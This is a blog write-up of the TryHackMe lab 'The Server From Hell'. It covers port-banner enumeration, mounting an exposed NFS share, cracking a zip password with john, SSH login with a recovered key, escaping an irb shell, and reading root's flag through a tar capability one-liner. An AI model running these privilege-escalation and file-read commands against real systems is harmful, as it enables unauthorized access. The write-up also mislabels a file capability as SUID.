---
layout: post
title: TryHackMe - The Server From hell
date: 2023-10-08 23:50:00 +0700
tags: [security, Firewall, nfs, shell escape]
toc: true
---

<p class="message">Face a server that feels as if it was configured and deployed by Satan himself. Can you escalate to root?</p>

Start at port 1337 and enumerate your way.
Good luck.

| Title      | The Server From Hell                  |
| ---------- | ------------------------------------- |
| Difficulty | Medium                                |
| Author     | DeadPackets                           |
| Tags       | security, Firewall, nfs, shell escape |

## Enumeration

### Nmap

Through the instruction of the room, it said “_Start at port 1337_” → I will use the **nmap** to scan only the `1337` port

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -A -Pn -p 1337 svfromhell.thm
[sudo] password for kali:
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-09 11:05 EDT
Nmap scan report for svfromhell.thm (10.10.245.1)
Host is up (0.34s latency).

PORT     STATE SERVICE VERSION
1337/tcp open  waste?
| fingerprint-strings:
|   GenericLines, LDAPSearchReq, NULL, X11Probe:
|     Welcome traveller, to the beginning of your journey
|     begin, find the trollface
|     Legend says he's hiding in the first 100 ports
|_    printing the banners from the ports
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V=7.94%I=7%D=10/9%Time=652416B3%P=x86_64-pc-linux-gnu%r(NU
SF:LL,A7,"Welcome\x20traveller,\x20to\x20the\x20beginning\x20of\x20your\x2
SF:0journey\nTo\x20begin,\x20find\x20the\x20trollface\nLegend\x20says\x20h
SF:e's\x20hiding\x20in\x20the\x20first\x20100\x20ports\nTry\x20printing\x2
SF:0the\x20banners\x20from\x20the\x20ports")%r(GenericLines,A7,"Welcome\x2
SF:0traveller,\x20to\x20the\x20beginning\x20of\x20your\x20journey\nTo\x20b
SF:egin,\x20find\x20the\x20trollface\nLegend\x20says\x20he's\x20hiding\x20
SF:in\x20the\x20first\x20100\x20ports\nTry\x20printing\x20the\x20banners\x
SF:20from\x20the\x20ports")%r(X11Probe,A7,"Welcome\x20traveller,\x20to\x20
SF:the\x20beginning\x20of\x20your\x20journey\nTo\x20begin,\x20find\x20the\
SF:x20trollface\nLegend\x20says\x20he's\x20hiding\x20in\x20the\x20first\x2
SF:0100\x20ports\nTry\x20printing\x20the\x20banners\x20from\x20the\x20port
SF:s")%r(LDAPSearchReq,A7,"Welcome\x20traveller,\x20to\x20the\x20beginning
SF:\x20of\x20your\x20journey\nTo\x20begin,\x20find\x20the\x20trollface\nLe
SF:gend\x20says\x20he's\x20hiding\x20in\x20the\x20first\x20100\x20ports\nT
SF:ry\x20printing\x20the\x20banners\x20from\x20the\x20ports");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: phone|VoIP phone|general purpose|WAP|proxy server|webcam
Running (JUST GUESSING): Google Android 4.4.X|4.0.X (92%), Cisco embedded (91%), Linux 3.X (91%), Linksys embedded (91%), WebSense embedded (90%), AXIS embedded (89%)
OS CPE: cpe:/o:google:android:4.4.0 cpe:/h:cisco:cp-dx80 cpe:/o:google:android cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel cpe:/h:linksys:ea3500 cpe:/o:google:android:4.0.4
Aggressive OS guesses: Android 4.4.0 (92%), Cisco CP-DX80 collaboration endpoint (Android) (91%), Linux 3.6 - 3.10 (91%), Linksys EA3500 WAP (91%), Websense Content Gateway (90%), Axis M3006-V network camera (89%), Android 4.0.4 (Linux 2.6) (89%), Linux 2.6.18 - 2.6.24 (89%), Linux 3.16 (89%), Linux 4.4 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 1337/tcp)
HOP RTT       ADDRESS
1   339.14 ms 10.9.0.1
2   339.13 ms svfromhell.thm (10.10.245.1)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.73 seconds
```

At the **fingerprint-strings** section:

```
| fingerprint-strings:
|   GenericLines, LDAPSearchReq, NULL, X11Probe:
|     Welcome traveller, to the beginning of your journey
|     begin, find the trollface
|     Legend says he's hiding in the first 100 ports
|_    printing the banners from the ports
```

The message from port `1337` tells me that there is something hidden in **the first 100 ports** and it recommends me to **print out the banners** only. Let’s do another scan:

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC --script=banner -Pn -p 0-100 svfromhell.thm
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-09 11:10 EDT
```

If you look at the first 50 port-banners, it actually displays a **trollface**:

```
┌──(kali㉿kali)-[~/TryHackMe/svfromhell]
└─$ cat nmap_100 | grep "banner"
# Nmap 7.94 scan initiated Mon Oct  9 11:12:39 2023 as: nmap -sC --script=banner -Pn -p 0-100 -o TryHackMe/svfromhell/nmap_100 svfromhell.thm
| banner: 550 [REDACTED] 00000000000000000000000000000000000000000000000000000
| banner: 550 [REDACTED] 00000000000000000000000000000000000000000000000000000
| banner: 550 [REDACTED] 00000000000000000000000000000000000000000000000000000
| banner: 550 [REDACTED] 00000000000000000000000000000000000000000000000000000
| banner: 550 [REDACTED] 00000000000000000000000000000000000000000000000000000
| banner: 550 [REDACTED] 0ffffffffffffffffffffffffffffffffffffffffffffffffffff
| banner: 550 [REDACTED] 0fffffffffffff777778887777777777cffffffffffffffffffff
| banner: 550 [REDACTED] 0fffffffffff8000000000000000008888887cfcfffffffffffff
| banner: 550 [REDACTED] 0ffffffffff80000088808000000888800000008887ffffffffff
| banner: 550 [REDACTED] 0fffffffff70000088800888800088888800008800007ffffffff
| banner: 550 [REDACTED] 0fffffffff000088808880000000000000088800000008fffffff
| banner: 550 [REDACTED] 0ffffffff80008808880000000880000008880088800008ffffff
| banner: 550 [REDACTED] 0ffffffff000000888000000000800000080000008800007fffff
| banner: 550 [REDACTED] 0fffffff8000000000008888000000000080000000000007fffff
| banner: 550 [REDACTED] 0ffffff70000000008cffffffc0000000080000000000008fffff
| banner: 550 [REDACTED] 0ffffff8000000008ffffff007f8000000007cf7c80000007ffff
| banner: 550 [REDACTED] 0fffff7880000780f7cffff7800f8000008fffffff80808807fff
| banner: 550 [REDACTED] 0fff78000878000077800887fc8f80007fffc7778800000880cff
| banner: 550 [REDACTED] 0ff70008fc77f7000000f80008f8000007f0000000000000888ff
| banner: 550 [REDACTED] 0ff0008f00008ffc787f70000000000008f000000087fff8088cf
| banner: 550 [REDACTED] 0f7000f800770008777 go to port [REDACTED] 80008f7f700880cf
| banner: 550 [REDACTED] 0f8008c008fff8000000000000780000007f800087708000800ff
| banner: 550 [REDACTED] 0f8008707ff07ff8000008088ff800000000f7000000f800808ff
| banner: 550 [REDACTED] 0f7000f888f8007ff7800000770877800000cf780000ff00807ff
| banner: 550 [REDACTED] 0ff0808800cf0000ffff70000f877f70000c70008008ff8088fff
| banner: 550 [REDACTED] 0ff70800008ff800f007fff70880000087f70000007fcf7007fff
| banner: 550 [REDACTED] 0fff70000007fffcf700008ffc778000078000087ff87f700ffff
| banner: 550 [REDACTED] 0ffffc000000f80fff700007787cfffc7787fffff0788f708ffff
| banner: 550 [REDACTED] 0fffff7000008f00fffff78f800008f887ff880770778f708ffff
| banner: 550 [REDACTED] 0ffffff8000007f0780cffff700000c000870008f07fff707ffff
| banner: 550 [REDACTED] 0ffffcf7000000cfc00008fffff777f7777f777fffffff707ffff
| banner: 550 [REDACTED] 0cccccff0000000ff000008c8cffffffffffffffffffff807ffff
| banner: 550 [REDACTED] 0fffffff70000000ff8000c700087fffffffffffffffcf808ffff
| banner: 550 [REDACTED] 0ffffffff800000007f708f000000c0888ff78f78f777c008ffff
| banner: 550 [REDACTED] 0fffffffff800000008fff7000008f0000f808f0870cf7008ffff
| banner: 550 [REDACTED] 0ffffffffff7088808008fff80008f0008c00770f78ff0008ffff
| banner: 550 [REDACTED] 0fffffffffffc8088888008cffffff7887f87ffffff800000ffff
| banner: 550 [REDACTED] 0fffffffffffff7088888800008777ccf77fc777800000000ffff
| banner: 550 [REDACTED] 0fffffffffffffff800888880000000000000000000800800cfff
| banner: 550 [REDACTED] 0fffffffffffffffff70008878800000000000008878008007fff
| banner: 550 [REDACTED] 0fffffffffffffffffff700008888800000000088000080007fff
| banner: 550 [REDACTED] 0fffffffffffffffffffffc800000000000000000088800007fff
| banner: 550 [REDACTED] 0fffffffffffffffffffffff7800000000000008888000008ffff
| banner: 550 [REDACTED] 0fffffffffffffffffffffffff7878000000000000000000cffff
| banner: 550 [REDACTED] 0ffffffffffffffffffffffffffffffc880000000000008ffffff
| banner: 550 [REDACTED] 0ffffffffffffffffffffffffffffffffff7788888887ffffffff
| banner: 550 [REDACTED] 0ffffffffffffffffffffffffffffffffffffffffffffffffffff
| banner: 550 [REDACTED] 00000000000000000000000000000000000000000000000000000
| banner: 550 [REDACTED] 00000000000000000000000000000000000000000000000000000
| banner: 550 [REDACTED] 00000000000000000000000000000000000000000000000000000
[...]
```

And in the middle of the face, a message (banner) mentions another port to look for, which can see from the nmap scan:

```
21/tcp  open   ftp
| banner: 550 [REDACTED] 0f7000f800770008777 go to port [REDACTED] 80008f7f700880cf
|_00
```

Keep continue enumerating that specified port:

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -A -Pn -p [REDACTED] svfromhell.thm
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-09 11:18 EDT
Nmap scan report for svfromhell.thm (10.10.245.1)
Host is up (0.34s latency).

PORT      STATE SERVICE VERSION
[REDACTED]/tcp open  netbus?
| fingerprint-strings:
|   NULL:
|     NFS shares are cool, especially when they are misconfigured
|_    It's on the standard port, no need for another scan
[...]
```

### NFS

Ok, now it is talking about the **NFS** **shares**. The **NFS shares** is _a client/server system that allows users to access files across a network and treat them as if they resided in a local file directory_ (from [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting)). Then I use **showmount** to enumerate which directory that I could mount on:

```
┌──(kali㉿kali)-[~/TryHackMe/svfromhell]
└─$ showmount -e svfromhell.thm
Export list for svfromhell.thm:
/home/nfs *
```

I create a new directory used for the **nfs** > mount it > list the file(s) inside:

```
┌──(kali㉿kali)-[~/TryHackMe/svfromhell]
└─$ mkdir mnt

┌──(kali㉿kali)-[~/TryHackMe/svfromhell]
└─$ sudo mount -t nfs svfromhell.thm:/home/nfs mnt/
[sudo] password for kali:

┌──(kali㉿kali)-[~/TryHackMe/svfromhell]
└─$ ls -l
total 4
drwxr-xr-x 2 nobody nogroup 4096 Sep 15  2020 mnt

┌──(kali㉿kali)-[~/TryHackMe/svfromhell]
└─$ ls -l mnt
total 8
-rw-r--r-- 1 root root 4534 Sep 15  2020 backup.zip
```

The **backup.zip** is the only thing available inside the **mnt/** directory and it will obviously contain something helpful. However, the **unzip** process requires a password:

```
┌──(kali㉿kali)-[~/TryHackMe/svfromhell]
└─$ unzip mnt/backup.zip
Archive:  mnt/backup.zip
   creating: home/hades/.ssh/
[mnt/backup.zip] home/hades/.ssh/id_rsa password:
   skipping: home/hades/.ssh/id_rsa  incorrect password
   skipping: home/hades/.ssh/hint.txt  incorrect password
   skipping: home/hades/.ssh/authorized_keys  incorrect password
   skipping: home/hades/.ssh/flag.txt  incorrect password
   skipping: home/hades/.ssh/id_rsa.pub  incorrect password
```

Don’t worry, **zip2john** can retrieve the hash password of the zip file and **john** can then crack it into plaintext:

```
┌──(kali㉿kali)-[~/TryHackMe/svfromhell]
└─$ zip2john mnt/backup.zip
ver 1.0 mnt/backup.zip/home/hades/.ssh/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 backup.zip/home/hades/.ssh/id_rsa PKZIP Encr: TS_chk, cmplen=2107, decmplen=3369, crc=6F72D66B ts=B16D cs=b16d type=8
ver 1.0 efh 5455 efh 7875 ** 2b ** backup.zip/home/hades/.ssh/hint.txt PKZIP Encr: TS_chk, cmplen=22, decmplen=10, crc=F51A7381 ts=B16D cs=b16d type=0
ver 2.0 efh 5455 efh 7875 backup.zip/home/hades/.ssh/authorized_keys PKZIP Encr: TS_chk, cmplen=602, decmplen=736, crc=1C4C509B ts=B16D cs=b16d type=8
ver 1.0 efh 5455 efh 7875 ** 2b ** backup.zip/home/hades/.ssh/flag.txt PKZIP Encr: TS_chk, cmplen=45, decmplen=33, crc=2F9682FA ts=B16D cs=b16d type=0
ver 2.0 efh 5455 efh 7875 backup.zip/home/hades/.ssh/id_rsa.pub PKZIP Encr: TS_chk, cmplen=602, decmplen=736, crc=1C4C509B ts=B16D cs=b16d type=8
backup.zip:$pkzip$5*1*1*0*0*24*b16d*80696ae8c675f1ef5df2906662a9a7ce07485c18db37feb8b97ed560e572ce5cf805afb4*1*0*8*24*b16d*7d8849d53ca2d690df91b5f8ff302e0eae9c13c7fbb169b6d935abdfef8c00e339f84c09*1*0*8*24*b16d*f08eeb86fce5cd5368b57ab3b4848df3b526da3fc467bc17c191210c596608311a8a5cf1*1*0*8*24*b16d*7168a30d9a64dc6df0956c675b62ff980dbd4f16fe022b1abb1c75e1943c97e47bbdc5f5*2*0*16*a*f51a7381*8e5*52*0*16*b16d*5050fa8c08f92051a2cad9941e8a8f4522a8c5dbfa32*$/pkzip$::backup.zip:home/hades/.ssh/hint.txt, home/hades/.ssh/flag.txt, home/hades/.ssh/authorized_keys, home/hades/.ssh/id_rsa.pub, home/hades/.ssh/id_rsa:mnt/backup.zip
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.

┌──(kali㉿kali)-[~/TryHackMe/svfromhell]
└─$ nano zip_hash

┌──(kali㉿kali)-[~/TryHackMe/svfromhell]
└─$ cat zip_hash
backup.zip:$pkzip$5*1*1*0*0*24*b16d*80696ae8c675f1ef5df2906662a9a7ce07485c18db37feb8b97ed560e572ce5cf805afb4*1*0*8*24*b16d*7d8849d53ca2d690df91b5f8ff302e0eae9c13c7fbb169b6d935abdfef8c00e339f84c09*1*0*8*24*b16d*f08eeb86fce5cd5368b57ab3b4848df3b526da3fc467bc17c191210c596608311a8a5cf1*1*0*8*24*b16d*7168a30d9a64dc6df0956c675b62ff980dbd4f16fe022b1abb1c75e1943c97e47bbdc5f5*2*0*16*a*f51a7381*8e5*52*0*16*b16d*5050fa8c08f92051a2cad9941e8a8f4522a8c5dbfa32*$/pkzip$

┌──(kali㉿kali)-[~/TryHackMe/svfromhell]
└─$ john --wordlist=~/Wordlists/rockyou.txt zip_hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[REDACTED]          (backup.zip)
1g 0:00:00:00 DONE (2023-10-09 11:35) 100.0g/s 819200p/s 819200c/s 819200C/s [REDACTED]6..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Since I’ve known the password of the zip file, I simply unzip it and retrive the `.ssh` directory of user **hades**: and easily get the first flag:

```
┌──(kali㉿kali)-[~/TryHackMe/svfromhell]
└─$ unzip mnt/backup.zip
Archive:  mnt/backup.zip
[mnt/backup.zip] home/hades/.ssh/id_rsa password:
  inflating: home/hades/.ssh/id_rsa
 extracting: home/hades/.ssh/hint.txt
  inflating: home/hades/.ssh/authorized_keys
 extracting: home/hades/.ssh/flag.txt
  inflating: home/hades/.ssh/id_rsa.pub

┌──(kali㉿kali)-[~/TryHackMe/svfromhell]
└─$ ls -l home/hades/.ssh
total 20
-rw-r--r-- 1 kali kali  736 Sep 15  2020 authorized_keys
-rw-r--r-- 1 kali kali   33 Sep 15  2020 flag.txt
-rw-r--r-- 1 kali kali   10 Sep 15  2020 hint.txt
-rw------- 1 kali kali 3369 Sep 15  2020 id_rsa
-rw-r--r-- 1 kali kali  736 Sep 15  2020 id_rsa.pub

┌──(kali㉿kali)-[~/TryHackMe/svfromhell]
└─$ cat home/hades/.ssh/flag.txt
thm{[REDACTED]}
```

## Gain Access

There is a **id_rsa** key used for **ssh authentication** of user **hades**. Therefore, I immediately establish a ssh connection to the target server. However, I forget that this server is really tricky and the real **ssh port** is not the same as the default ssh port `22`:

```
┌──(kali㉿kali)-[~/TryHackMe/svfromhell]
└─$ ssh hades@svfromhell.thm -i home/hades/.ssh/id_rsa
kex_exchange_identification: read: Connection reset by peer
Connection reset by 10.10.245.1 port 22
```

Fortunately, the **hint.txt** file might contain the information I need that indicate the **ssh port**:

```
┌──(kali㉿kali)-[~/TryHackMe/svfromhell]
└─$ cat home/hades/.ssh/hint.txt
2500-4500
```

The _2500-4500_ must display a range of port used for **ssh connection**. So I take another **nmap** scan on the port. The result contains an enormous things to look through, then I save it into a file and use `grep` to find out the information that I want to:

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC --script=banner -Pn -p 2500-4500 svfromhell.thm -o TryHackMe/svfromhell/nmap_ssh
[...]

┌──(kali㉿kali)-[~/TryHackMe/svfromhell]
└─$ cat nmap_ssh | grep "OpenSSH" --before-context 3
2707/tcp open  emcsymapiport
|_banner: \xFF\xFE\x01Foxconn VoIP TRIO 3C
2708/tcp open  banyan-net
|_banner: SSH-763-OpenSSH_cIMddP FreeBSD localisations 5r?
--
3332/tcp open  mcs-mailsvr
|_banner: 0\xCA00000\x040000
[REDACTED]/tcp open  dec-notes
|_banner: SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
--
3472/tcp open  jaugsremotec-1
|_banner: 0fpmxywp\x14Crp\x11^a\x11G
3474/tcp open  ttntspauto
|_banner: SSH-17070095-OpenSSH_u-r-hpnxr?
--
| banner: 220 S+ ESMTP Service (Worldmail 8\xEC\xDE\xF9\xAF\xF1\xF9) read
|_y
3798/tcp open  minilock
|_banner: SSH-2.0-OpenSSH\x0D?
--
3848/tcp open  item
|_banner: HTTP/1.1 200 OK\x0D\x0AjServer: Kayak\x0D\x0ADate: 421515
3849/tcp open  spw-dnspreload
|_banner: SSH-68878660-OpenSSH_WRLitS-FC-lZFbqDpm.fc5r
```

The actual port used for the **SSH** must be displayed with the version of that **ssh service** which is:

```
[REDACTED]/tcp open  dec-notes
|_banner: SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
```

Now I know the exact port that running **ssh** service → It’s time to connect to the target server via that port:

```
┌──(kali㉿kali)-[~/TryHackMe/svfromhell]
└─$ ssh hades@svfromhell.thm -i home/hades/.ssh/id_rsa -p [REDACTED]

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

 ██░ ██ ▓█████  ██▓     ██▓
▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒
▒██▀▀██░▒███   ▒██░    ▒██░
░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░
░▓█▒░██▓░▒████▒░██████▒░██████▒
 ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
 ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
 ░  ░░ ░   ░     ░ ░     ░ ░
 ░  ░  ░   ░  ░    ░  ░    ░  ░

 Welcome to hell. We hope you enjoy your stay!


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

 ██░ ██ ▓█████  ██▓     ██▓
▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒
▒██▀▀██░▒███   ▒██░    ▒██░
░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░
░▓█▒░██▓░▒████▒░██████▒░██████▒
 ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
 ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
 ░  ░░ ░   ░     ░ ░     ░ ░
 ░  ░  ░   ░  ░    ░  ░    ░  ░

 Welcome to hell. We hope you enjoy your stay!
 irb(main):001:0>
```

The display shell does not look like a normal shell that is usually used, I have tried a few commands but most of them did not work:

```
irb(main):002:0> whoami
Traceback (most recent call last):
        2: from /usr/bin/irb:11:in `<main>'
        1: from (irb):2
NameError (undefined local variable or method `whoami' for main:Object)
irb(main):003:0> help

Enter the method name you want to look up.
You can use tab to autocomplete.
Enter a blank line to exit.

>> id
Nothing known about .id
>> exit
Nothing known about .exit
>>
=> nil
irb(main):004:0> ?
irb(main):005:0>
```

Then I notice the letter **irb** (Interactive Ruby Shell) standing at the beginning of the line, google it for awhile I explore the way to establish the real shell:

```
irb(main):006:0> exec '/bin/bash'
hades@hell:~$ whoami;id;pwd
hades
uid=1002(hades) gid=1002(hades) groups=1002(hades)
/home/hades
```

Then I get the user flag in the current directory:

```
hades@hell:~$ ls -la
total 28
drwxr-xr-x 3 root  root  4096 Sep 15  2020 .
drwxr-xr-x 6 root  root  4096 Sep 15  2020 ..
-rw-r--r-- 1 hades hades  220 Sep 15  2020 .bash_logout
-rw-r--r-- 1 hades hades 3771 Sep 15  2020 .bashrc
-rw-r--r-- 1 hades hades  807 Sep 15  2020 .profile
drwx------ 2 hades hades 4096 Sep 15  2020 .ssh
-rw-r--r-- 1 hades hades   30 Sep 15  2020 user.txt
hades@hell:~$ cat user.txt
thm{[REDACTED]}
```

## Root Flag

I use **getcap** and explore a binary that set with **SUID** privilege:

```
hades@hell:~$ getcap / -r 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
/bin/tar = cap_dac_read_search+ep
hades@hell:~$ ls -l /bin/tar
-rwxr-xr-x 1 root root 423312 Jan 21  2019 /bin/tar
```

Via [GTFOBins](https://gtfobins.github.io/gtfobins/tar/#file-read), the **tar** service which has **SUID** bit set could help me to read the file that belongs to the owner which is **root**. Therefore, I use it to read the root flag inside the **/root** directory:

```
hades@hell:~$ /bin/tar xf "/root/root.txt" -I '/bin/sh -c "cat 1>&2"'
thm{[REDACTED]}
```
